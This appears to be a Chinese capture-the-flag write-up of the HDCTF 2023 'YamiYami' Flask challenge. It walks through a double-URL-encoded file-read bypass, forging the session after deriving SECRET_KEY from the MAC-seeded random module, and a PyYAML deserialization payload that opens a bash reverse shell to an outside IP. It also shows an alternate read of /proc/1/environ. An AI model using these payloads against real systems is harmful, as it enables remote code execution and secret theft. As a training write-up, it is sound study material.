#  [HDCTF 2023]YamiYami

## 0、知识点

>   python伪随机数

>   Session伪造

>   任意文件读取

>   Pyyaml反序列化



## 解题

-   打开题目主页可以发现存在三个地址

    -   `href="/read?url=https://baidu.com"`
        -   根据地址名read猜测可以读文件，url可以联想到SSRF，进而可以尝试是否存在任意文件读取
    -   `href="/upload"`
    -   `href="/pwd"`
        -   打开 会显示一个路径`/app`

-   然后尝试读源码

-   使用file:///app.py

    -   发现存在过滤返回：`re.findall('app.*', url, re.IGNORECASE)`
    -   绕过方式双重URL编码绕过

-   绕过后并未发现源码，想起pwd显示的路径

    -   最终playload

    -   ```nginx
        http://node2.anna.nssctf.cn:28636/read?url=file:///%25%36%31%25%37%30%25%37%30/%25%36%31%25%37%30%25%37%30.py
        ```

>   获取到源码

```python
encoding:utf-8
import os
import re, random, uuid
from flask import *
from werkzeug.utils import *
import yaml
from urllib.request import urlopen
app = Flask(__name__)


'''
    # UUID 的第一个版本的值是基于主机的 MAC 地址来计算的
    # uuid 模块使用 getnode() 来获取当前系统的 MAC 地址值
    # 如果一个系统的网卡不止一块，那么就有多个 MAC 地址，因此返回的值可能是其中的任意一个。
    # uuid.getnode()返回的值是Mac值的16进制形式，但是去掉了中间的冒号
    if __name__ == '__main__':
        random.seed(0x0242ac024cce)
        print(str(random.random() * 233))
'''
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = False
# 黑名单
BLACK_LIST=["yaml","YAML","YML","yml","yamiyami"]

# 文件上传的位置
app.config['UPLOAD_FOLDER']="/app/uploads"

@app.route('/')
def index():
    session['passport'] = 'YamiYami'
    return '''
    Welcome to HDCTF2023 <a href="/read?url=https://baidu.com">Read somethings</a>
    <br>
    Here is the challenge <a href="/upload">Upload file</a>
    <br>
    Enjoy it <a href="/pwd">pwd</a>
    '''
@app.route('/pwd')
def pwd():
    return str(pwdpath)
@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('app.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m:
            return "re.findall('app.*', url, re.IGNORECASE)"
        if n:
            return "re.findall('flag', url, re.IGNORECASE)"
        res = urlopen(url)
        return res.read()
    except Exception as ex:
        print(str(ex))
    return 'no response'

def allowed_file(filename):
  	for blackstr in BLACK_LIST:
        if blackstr in filename:
           	return False
   	return True
@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            return "Empty file"
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            if not os.path.exists('./uploads/'):
                os.makedirs('./uploads/')
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            return "upload successfully!"
    return render_template("index.html")
@app.route('/boogipop')
def load():
    if session.get("passport")=="Welcome To HDCTF2023":

        LoadedFile=request.args.get("file")
        # 判断文件是否存在
        if not os.path.exists(LoadedFile):
            return "file not exists"
        # with as 用来处理文件内容
        with open(LoadedFile) as f:
            # yaml.full_load() 将YAML 格式的字符串或文件加载成Python 对象
            yaml.full_load(f)
            f.close()
        return "van you see"
    else:
        return "No Auth bro"
if __name__=='__main__':
    pwdpath = os.popen("pwd").read()
    app.run(
        debug=False,
        host="0.0.0.0"
    )
    print(app.config['SECRET_KEY'])
```

>   分析后得出，首先需要进行session伪造 -> `if session.get("passport")=="Welcome To HDCTF2023":`

>   怎么进行session伪造查看这篇文章：https://cbatl.gitee.io/2020/11/15/Flask-session/

>   但伪造session的前提是需要知道：`SECRET_KEY`，
>
>   这个参数值主要是由这里生成的`random.seed(uuid.getnode())`
>
>   `uuid.getnode():`返回的值是Mac值的16进制形式，但是去掉了中间的冒号

>   linux的网卡地址在：`/sys/class/net/eth0/addres`中

>   读取网卡的值：02:42:ac:02:4d:ad，然后使用以下脚本计数SECRET_KEY`值

```py
import random

if __name__ == '__main__':
    random.seed(0x0242ac024dad)
    print(str(random.random() * 233))
   	# 结果：132.76992396847822
```

>   然后进行伪造使用命令

```nginx
python3.9 flask_session_cookie_manager3.py decode -c "eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZEiQZA.MxDCX2hJb-pvOeb7T3U48RhsrtI" -s "132.76992396847822"
# 结果为：{'passport': 'YamiYami'}
```

```nginx
python3.9 flask_session_cookie_manager3.py encode -t "{'passport': 'Welcome To HDCTF2023'}" -s  "132.76992396847822"
# 结果为：eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.ZEiSkQ.UJ6u_SeyNSd2dTKGE0yuBEROShs
```

>   然后将得到session值放入请求头

>   然后就是pyyaml的反序列，看了下出题人的payload，使用了反弹shell

```yaml
!!python/object/new:str
    args: []
    state: !!python/tuple
      - "__import__('os').system('bash -c \"bash -i >& /dev/tcp/114.116.119.253/7777 <&1\"')"
      - !!python/object/new:staticmethod
        args: []
        state:
          update: !!python/name:eval
          items: !!python/name:list
```

>   上传成功后去访问这个文件就会触发

>   **另外这题还有一个非预期解**

>   **直接使用file协议读取环境变量值 就可以拿到flag**：`file:///proc/1/environ`
